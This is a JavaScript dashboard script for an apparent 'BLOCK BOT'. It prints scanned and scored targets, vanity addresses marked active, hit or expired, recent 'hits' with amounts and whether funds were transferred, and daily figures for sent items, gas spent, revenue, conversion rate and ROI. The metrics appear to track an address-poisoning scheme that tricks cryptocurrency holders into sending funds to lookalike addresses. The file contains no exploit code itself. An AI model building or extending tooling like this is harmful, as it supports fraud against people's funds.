import 'dotenv/config';
import { getStatsRange, getAllHits, getAllVanities, getAllTargets } from './lib/db.js';
import { redis } from './lib/redis.js';

async function main() {
  console.log(`
┌─────────────────────────────────────────┐
│  BLOCK BOT — Dashboard                 │
└─────────────────────────────────────────┘
`);

  // ── Targets ───────────────────────────────────────
  const targets = await getAllTargets();
  console.log(`  Targets scanned: ${targets.length}`);
  const highScore = targets.filter((t) => t.score >= 70);
  console.log(`  Score >= 70:     ${highScore.length}`);

  // ── Vanity Addresses ──────────────────────────────
  const vanities = await getAllVanities();
  const active = vanities.filter((v) => v.status === 'active');
  const hits = vanities.filter((v) => v.status === 'hit');
  const expired = vanities.filter((v) => v.status === 'expired');
  console.log(`\n  Vanity addresses: ${vanities.length}`);
  console.log(`    Active:  ${active.length}`);
  console.log(`    Hit:     ${hits.length}`);
  console.log(`    Expired: ${expired.length}`);

  // ── Hits ──────────────────────────────────────────
  const allHits = await getAllHits();
  console.log(`\n  Total hits: ${allHits.length}`);
  if (allHits.length > 0) {
    console.log(`\n  Recent hits:`);
    for (const h of allHits.slice(0, 5)) {
      const transferred = h.transferTxHash ? ' → transferred' : ' (pending)';
      console.log(`    ${h.chain} | ${h.amount} ${h.token} | ${h.timestamp}${transferred}`);
    }
  }

  // ── Daily Stats (7 days) ──────────────────────────
  const stats = await getStatsRange(7);
  console.log(`\n  ── Last 7 days ──────────────────────────`);
  console.log(`  ${'Date'.padEnd(12)} ${'Scored'.padStart(7)} ${'Sent'.padStart(6)} ${'Hits'.padStart(5)} ${'Gas $'.padStart(8)} ${'Rev $'.padStart(8)} ${'Conv%'.padStart(7)}`);
  console.log(`  ${'─'.repeat(55)}`);
  for (const s of stats) {
    if (s.scored === 0 && s.sent === 0 && s.hits === 0) continue;
    console.log(`  ${s.date.padEnd(12)} ${String(s.scored).padStart(7)} ${String(s.sent).padStart(6)} ${String(s.hits).padStart(5)} ${s.gasSpent.toFixed(2).padStart(8)} ${s.revenue.toFixed(2).padStart(8)} ${s.conversionRate.toFixed(2).padStart(6)}%`);
  }

  const totals = stats.reduce((acc, s) => ({
    scored: acc.scored + s.scored,
    sent: acc.sent + s.sent,
    hits: acc.hits + s.hits,
    gasSpent: acc.gasSpent + s.gasSpent,
    revenue: acc.revenue + s.revenue,
  }), { scored: 0, sent: 0, hits: 0, gasSpent: 0, revenue: 0 });

  const convRate = totals.sent > 0 ? (totals.hits / totals.sent * 100).toFixed(2) : '0.00';
  console.log(`  ${'─'.repeat(55)}`);
  console.log(`  ${'TOTAL'.padEnd(12)} ${String(totals.scored).padStart(7)} ${String(totals.sent).padStart(6)} ${String(totals.hits).padStart(5)} ${totals.gasSpent.toFixed(2).padStart(8)} ${totals.revenue.toFixed(2).padStart(8)} ${convRate.padStart(6)}%`);

  const roi = totals.gasSpent > 0 ? ((totals.revenue - totals.gasSpent) / totals.gasSpent * 100).toFixed(1) : 'N/A';
  console.log(`\n  ROI: ${roi}%`);
  console.log('');

  await redis.quit();
}

main().catch((err) => {
  console.error('Error:', err.message);
  process.exit(1);
});
